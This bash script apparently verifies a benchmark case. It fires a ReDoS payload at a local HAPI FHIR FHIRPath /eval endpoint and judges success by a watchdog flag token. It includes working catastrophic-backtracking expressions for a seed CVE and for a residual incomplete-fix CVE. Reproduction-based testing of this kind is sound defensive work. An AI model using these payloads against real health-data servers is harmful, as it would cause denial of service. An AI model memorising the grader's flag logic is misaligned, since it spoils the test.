#!/usr/bin/env bash
# verify.sh --seed|--residual — HAPI FHIR DSTU2 FHIRPathEngine ReDoS
# (CVE-2026-45367 seed / CVE-2026-55470 residual).
# Effect = handler-thread hang -> watchdog releases the start-injected PCB_FLAG.
# Judge by matching that token to the current RUN_FLAG (wrong/stale override fails).
# HTTP timeout alone is NOT success.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

CPORT=8080
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  echo "verify: compose port $VERSION:$CPORT failed (need --profile $VERSION)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
WDPORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port watchdog 8888 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$WDPORT" ]]; then
  echo "verify: compose port watchdog:8888 failed (need --profile $VERSION)" >&2
  exit 20
fi
BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2026-45367: V0(6.9.6) raw replaceAll hangs; V1(6.9.7) RegexTimeout ~500ms
  EXPR="replaceMatches('(.*a){30}','x')"
else
  # CVE-2026-55470 incomplete fix: V1 DSTU2 funcMatches still String.matches (no timeout)
  EXPR="matches('(.*a){30}')"
fi
BODY="$("$PY" -c "import json,sys; print(json.dumps({'expr': sys.argv[1], 'input': 'a'*250+'X'}))" "$EXPR")"

# Fire the ReDoS (sync regex wedges the 1-thread handler; curl timeout is expected on hang).
# Fast response => no hang this shot; still require watchdog token == current RUN_FLAG
# so a leftover/wrong/stale override cannot pass.
if curl -sS -m 5 -X POST "$BASE/eval" -H 'Content-Type: application/json' \
     -d "$BODY" >/dev/null 2>&1; then
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
  if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
fi

# Hang path: poll watchdog until start-injected PCB_FLAG is released.
ST=""; FLAG=""
for i in $(seq 1 20); do
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  [[ -n "$FLAG" ]] && break
  sleep 2
done
echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
